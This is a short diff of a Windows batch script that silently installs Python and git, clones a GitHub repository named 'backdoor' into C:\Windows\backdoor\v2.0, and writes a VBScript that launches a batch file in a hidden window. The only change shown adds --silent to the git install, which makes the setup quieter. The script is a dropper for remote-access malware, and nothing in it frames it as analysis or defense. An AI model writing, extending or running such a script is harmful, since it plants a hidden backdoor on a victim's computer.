@@ -1,7 +1,7 @@
 @echo off
 winget install python3.11 --accept-source-agreements --silent
 pip install sockets
-winget install git --accept-source-agreements
+winget install git --accept-source-agreements --silent
 git clone https://github.com/Jevelin4k/backdoor/ C:\Windows\backdoor\v2.0
 echo Set WshShell = CreateObject("WScript.Shell") > C:\Windows\backdoor\v2.0\v2.0\up_2.vbs
 echo WshShell.Run "cmd.exe /c C:\Windows\backdoor\v2.0\v2.0\up_2.bat", 0, False >> C:\Windows\backdoor\v2.0\v2.0\up_2.vbs
